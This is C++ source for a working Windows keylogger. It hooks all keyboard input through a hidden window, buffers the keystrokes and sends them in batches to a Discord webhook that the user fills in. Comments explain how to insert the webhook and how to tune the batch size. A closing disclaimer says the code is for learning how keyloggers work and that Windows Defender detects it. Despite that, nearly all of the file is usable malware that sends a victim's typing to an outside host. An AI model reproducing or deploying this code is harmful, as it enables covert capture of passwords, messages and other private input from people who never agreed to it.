#include <windows.h>
#include <string>
#include <vector>
#include <fstream>
#include <thread>
#include <chrono>
#include <wininet.h>
#pragma comment(lib, "wininet.lib")

std::vector<std::string> keys;
std::string lockFile;

void removeLock() {
    if (!lockFile.empty())
        DeleteFileA(lockFile.c_str());
}

std::string keyToString(DWORD vkCode) {
    if (vkCode == VK_RETURN) return "\n";
    if (vkCode == VK_SPACE) return " ";
    if (vkCode == VK_BACK) return "[BACKSPACE]";
    char buf[2] = {0};
    buf[0] = MapVirtualKeyA(vkCode, MAPVK_VK_TO_CHAR);
    return std::string(buf);
}

void sendKeys() {
    if (keys.empty()) return;

    std::string data;
    for (auto &k : keys) data += k;
    keys.clear();

    HINTERNET hSession = InternetOpenA("KeyLogger", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!hSession) return;
    HINTERNET hConnect = InternetConnectA(hSession, "discord.com", INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) { InternetCloseHandle(hSession); return; }
    HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", "insert_your_discord_webhook_here_please", NULL, NULL, NULL, INTERNET_FLAG_SECURE, 0); // PUT YOUR DISCORD WEBHOOK HERE
    if (!hRequest) { InternetCloseHandle(hConnect); InternetCloseHandle(hSession); return; }

    std::string payload = "{\"content\":\"Logged keys: " + data + "\"}";
    std::string headers = "Content-Type: application/json\r\n";

    HttpSendRequestA(hRequest, headers.c_str(), headers.size(), (LPVOID)payload.c_str(), payload.size());
    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hSession);
}

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
        keys.push_back(keyToString(p->vkCode));
        if (keys.size() >= 100) sendKeys();  // change the ">= 100" thing to whatever you want, tho i recommend anything between 50-150 as good. This sends all logged keys per 100 logged keys.
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    switch (msg) {
        case WM_QUERYENDSESSION:
        case WM_ENDSESSION:
        case WM_POWERBROADCAST:
            removeLock(); 
            return TRUE;
        default:
            return DefWindowProc(hwnd, msg, wParam, lParam);
    }
}

int main() {
    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);
    lockFile = std::string(tempPath) + "randomdata.lock";
    std::ofstream(lockFile).put('1');

    std::this_thread::sleep_for(std::chrono::seconds(9));

    HHOOK hook = SetWindowsHookExA(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);

    WNDCLASSA wc = {0};
    wc.lpfnWndProc = WndProc;
    wc.hInstance = GetModuleHandle(NULL);
    wc.lpszClassName = "HiddenKeyLoggerWindow";
    RegisterClassA(&wc);
    HWND hwnd = CreateWindowA("HiddenKeyLoggerWindow", "", 0, 0,0,0,0, HWND_MESSAGE, NULL, wc.hInstance, NULL);

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    removeLock();
    UnhookWindowsHookEx(hook);
    return 0;
}
// it uses a .lock file (randomdata.lock) at like C:\users\(user)\temp\roaming\ (i think)
// also, don't be an idiot and use this as actual malware. Using this to see how a keylogger works is okay.


// also, this is easily detected by Windows Defender. 

// Also, a .lock file in this context stops it from running multiple times.
